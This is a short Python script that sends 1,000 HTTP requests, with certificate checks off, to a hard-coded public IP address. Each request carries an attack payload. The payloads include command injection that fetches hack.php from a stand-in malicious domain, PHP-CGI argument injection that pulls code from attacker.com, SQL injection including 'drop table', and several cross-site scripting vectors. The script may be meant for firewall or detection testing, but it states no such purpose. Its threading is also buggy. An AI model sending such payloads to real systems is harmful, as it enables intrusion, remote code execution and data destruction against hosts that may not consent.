import requests
import threading
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def visit(url, headers):
    prefix = 'https://52.78.82.9:8080'
    resp = None;
    if headers is None :
    	resp = requests.get(prefix + url, verify=False)
    else:
    	resp = requests.get(prefix + url, headers = headers, verify=False, timeout=10)

    print('msg: {resp}, url: <{url}>'.format(resp=resp, url=url))


url = ['/bot',
'/rootkit.php',
'/test.php?path=%3Bwget%20http://malicious-domain/hack.php',
'/cgi-bin/test.php?-dallow_url_include%3dOn+-dauto_prepend_file%3dhttp://attacker.com/evilcode.txt',
'/stacked?a = 1; drop table b;','/embedded?a = 1 and (select * from b where 1=1)',
'/condition?a = 1 or 1 = 1',
'/arithmetic?a = 1*1*1*1',
'/sqlfunction?a = MOD(x,y)',
'/tag?a=<input onfocus=write(1) autofocus>',
'/attribute?id=1 onload="alert(0)"',
'/css?a="style=-moz-binding:url(http://h4k.in/mozxss.xml#xss); a="',
'/jsfunction?a=function test(){A=alert;A(1)}',
'/id=hello";document.body.innerHTML="ddddd"//']

threads = []
for i in range(0, 1000):
	index = i % len(url)
	headers = None
	if (i == 0): 
		headers = {'User-Agent':'Cgichk'}
	if (i == 1):
		headers = {'X_File':'data.txt'}
	thread = threading.Thread(target = visit(url[index], headers))
	threads.append(thread)


for t in threads:
    t.start()
# for t in threads:
#     t.join()



